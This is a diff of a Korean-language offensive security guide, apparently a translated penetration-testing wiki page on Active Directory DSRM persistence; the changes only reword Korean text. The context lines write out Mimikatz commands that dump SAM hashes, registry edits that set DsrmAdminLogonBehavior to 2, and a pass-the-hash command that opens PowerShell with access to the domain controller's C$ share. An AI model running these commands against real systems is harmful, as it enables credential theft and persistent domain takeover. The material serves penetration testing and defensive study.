@@ -7,13 +7,13 @@
 ```bash
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"'
 ```
-그런 다음 해당 계정이 작동하는지 확인해야 하며, 레지스트리 키의 값이 "0"이거나 존재하지 않는 경우 **"2"로 설정해야 합니다**:
+그런 다음 해당 계정이 작동하는지 확인해야 하며, 레지스트리 키의 값이 "0"이거나 존재하지 않으면 **"2"로 설정해야 합니다**:
 ```bash
 Get-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior #Check if the key exists and get the value
 New-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2 -PropertyType DWORD #Create key with value "2" if it doesn't exist
 Set-ItemProperty "HKLM:\SYSTEM\CURRENTCONTROLSET\CONTROL\LSA" -name DsrmAdminLogonBehavior -value 2  #Change value to "2"
 ```
-그런 다음, PTH를 사용하여 **C$의 내용을 나열하거나 심지어 셸을 얻을 수 있습니다**. 메모리에 있는 해당 해시로 새로운 PowerShell 세션을 생성할 때 (PTH의 경우) **사용되는 "도메인"은 DC 머신의 이름일 뿐입니다:**
+그런 다음, PTH를 사용하여 **C$의 내용을 나열하거나 심지어 셸을 얻을 수 있습니다**. 메모리에 있는 해당 해시로 새 PowerShell 세션을 생성할 때 (PTH의 경우) **사용되는 "도메인"은 DC 머신의 이름일 뿐입니다:**
 ```bash
 sekurlsa::pth /domain:dc-host-name /user:Administrator /ntlm:b629ad5753f4c441e3af31c97fad8973 /run:powershell.exe
 #And in new spawned powershell you now can access via NTLM the content of C$
